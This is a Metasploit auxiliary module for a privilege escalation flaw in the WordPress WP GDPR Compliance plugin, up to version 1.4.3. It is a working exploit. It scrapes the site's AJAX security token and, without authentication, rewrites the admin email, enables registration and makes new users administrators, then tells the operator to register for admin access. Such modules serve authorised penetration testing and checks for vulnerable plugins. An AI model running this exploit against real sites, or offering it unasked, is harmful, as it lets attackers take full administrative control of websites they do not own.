##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress WP GDPR Compliance Plugin Privilege Escalation',
      'Description'     => %q{
        The Wordpress plugin GDPR Compliance allows unauthenticated users to execute any
        action and update any database value.
        This comes from a lack of validation in the plugin handles in WordPress’s admin-ajax.php
        functionality, which leads to unauthorized users being abler to trigger these handlers and
        from a failure to do capability checks when executing its internal action 'save_setting to
        make configuration changes.
      },
      'Author'          =>
        [
          'Mikey Veenstra (WordFence)', # Vulnerability discovery
          'Thomas Labadie' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['URL', 'https://www.wordfence.com/blog/2018/11/privilege-escalation-flaw-in-wp-gdpr-compliance-plugin-exploited-in-the-wild/'],
          ['WPVDB', '9144']
        ],
      'DisclosureDate'  => 'Nov 08 2018'
      ))
  end

  def check
    check_plugin_version_from_readme('wp-gdpr-compliance', '1.4.3')
  end

  def set_wp_option(name, value, ajax_security)
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => wordpress_url_admin_ajax,
      'vars_post' => {
        'action' => 'wpgdprc_process_action',
        'security' => ajax_security,
        'data' => "{\"type\":\"save_setting\",\"append\":false,\"option\":\"#{name}\",\"value\":\"#{value}\"}"
        }
      )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, "Unable to access Wordpress: #{wordpress_url_admin_ajax}")
    end

    res
  end

  def run
    print_status("Getting security token from host...")
    wp_home_res = send_request_cgi(
      'method'    => 'GET',
      'uri'       => target_uri.path
    )

    unless wp_home_res && wp_home_res.code == 200
      fail_with(Failure::UnexpectedReply, "Unable to access Wordpress: #{target_uri.path}")
    end

    ajax_security = wp_home_res.body[/"ajaxSecurity":"([a-zA-Z0-9]+)"/i, 1]

    new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
    print_status("Changing admin e-mail address to #{new_email}...")
    if set_wp_option('admin_email', new_email, ajax_security).nil?
      print_error("Failed to change the admin e-mail address")
      return
    end

    print_warning("Enabling user registrations...")
    if set_wp_option('users_can_register', '1', ajax_security).nil?
      print_error("Failed to enable user registrations")
      return
    end

    print_warning("Setting the default user role type to administrator...")
    if set_wp_option('default_role', 'administrator', ajax_security).nil?
      print_error("Failed to set the default user role")
      return
    end

    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
    print_good("Privilege escalation complete")
    print_good("Create a new account at #{register_url} to gain admin access.")
  end
end
